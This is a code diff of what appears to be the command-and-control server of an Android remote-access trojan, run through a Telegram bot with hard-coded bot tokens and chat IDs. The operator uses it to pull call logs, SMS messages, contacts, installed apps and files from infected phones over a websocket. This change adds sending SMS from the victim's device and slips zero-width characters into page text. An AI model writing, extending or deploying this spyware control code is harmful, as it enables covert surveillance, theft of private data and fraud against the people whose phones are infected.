@@ -11,13 +11,13 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '153559836'
-const token = '526009625:AAHHbRDh6xSJhXXZzLB0i6ZsY'
+const chatId = '385129421'
+const token = '514364323:AAGfhzOPVFRjTaGrEW9qBYgyafPbipI'
 const bot = new TelegramBot(token, {polling: true});
 
 // request -------------------------------------------------------------------
 app.get("/", (req, res) => {
-    res.send('<h1 style="text-align:center;">server uploded</h1>')
+    res.send('<h1 style="text-align:center;">S‌erver uploaded suc‌ces‌sfully</h1>')
 })
 app.post("/sendFile", upload.single('file'), (req, res) => {
     var name = req.file.originalname
@@ -80,9 +80,9 @@ bot.on("message", (msg) => {
         const clientCount = wss.clients.size
         if (clientCount > 0) {
             let Actions = [
-                [{text: 'Location 🛰', callback_data: "loc"}],
                 [{text: 'Call Log 📞', callback_data: "cl"}],
                 [{text: 'All Sms 💬', callback_data: "as"}],
+                [{text: 'Send Sms 💬', callback_data: "ss"}],
                 [{text: 'All Contact 👤', callback_data: "gc"}],
                 [{text: 'Installed Apps 📲', callback_data: "ia"}],
                 [{text: 'Device Model 📱', callback_data: 'dm'}],
@@ -103,21 +103,37 @@ bot.on("message", (msg) => {
             bot.sendMessage(chatId, `<b>No Online Client</b> ❌`, {parse_mode: "HTML"});
         }
     }
-    if (msg.reply_to_message){
-        const text = msg.reply_to_message.text;
-        const action = text.split('!')[0].split('&')[0]
-        const uuid = text.split('!')[0].split('&')[1]
-        const path = msg.text
-        wss.clients.forEach(client => {
-            if (client.uuid === uuid){
-                client.send(`${action}&${path}`)
-            }
-        })
-        bot.sendMessage(chatId, "Your Request Is On Progress !", {
-            "reply_markup": {
-                "keyboard": [["Status ⚙"], ["Action ☄"]]
-            }
-        });
+    if (msg.reply_to_message) {
+        if (msg.reply_to_message.text.split('&')[0] === 'ss'){
+            const data = msg.reply_to_message.text.split(']')[0].split("[")[1]
+            const uuid = msg.reply_to_message.text.split('!')[0].split('&')[1]
+            wss.clients.forEach(client=>{
+                if (client.uuid === uuid) {
+                    client.send(`ss&${data}`)
+                }
+            })
+            bot.sendMessage(chatId, "Your Request Is On Progress !", {
+                "reply_markup": {
+                    "keyboard": [["Status ⚙"], ["Action ☄"]]
+                }
+            });
+        }
+        if (msg.reply_to_message.text.split('&')[0] === 'df' || msg.reply_to_message.text.split('&')[0] === 'gf') {
+            const text = msg.reply_to_message.text;
+            const action = text.split('!')[0].split('&')[0]
+            const uuid = text.split('!')[0].split('&')[1]
+            const path = msg.text
+            wss.clients.forEach(client => {
+                if (client.uuid === uuid) {
+                    client.send(`${action}&${path}`)
+                }
+            })
+            bot.sendMessage(chatId, "Your Request Is On Progress !", {
+                "reply_markup": {
+                    "keyboard": [["Status ⚙"], ["Action ☄"]]
+                }
+            });
+        }
     }
 })
 
@@ -126,7 +142,18 @@ bot.on('callback_query', function onCallbackQuery(callbackQuery) {
     const clientId = callbackQuery.message.text.split('&')[1];
     wss.clients.forEach(client => {
         if (client.uuid === clientId) {
-            if (action === 'gf') {
+            if (action === 'ss') {
+                bot.sendMessage(
+                    chatId,
+                    `ss&${client.uuid}!\n\n<b>Action Send Sms\n🔵 Please Reply\n</b> <code>[{"number":"target number","message":"your message"}]</code>`,
+                    {
+                        reply_markup: {
+                            force_reply: true,
+                        },
+                        parse_mode: "HTML"
+                    }
+                )
+            } else if (action === 'gf') {
                 bot.sendMessage(
                     chatId,
                     `gf&${client.uuid}!\n\n<b>Action Get File / Folder\n🔵 Please Reply File / Folder Path:</b>`,
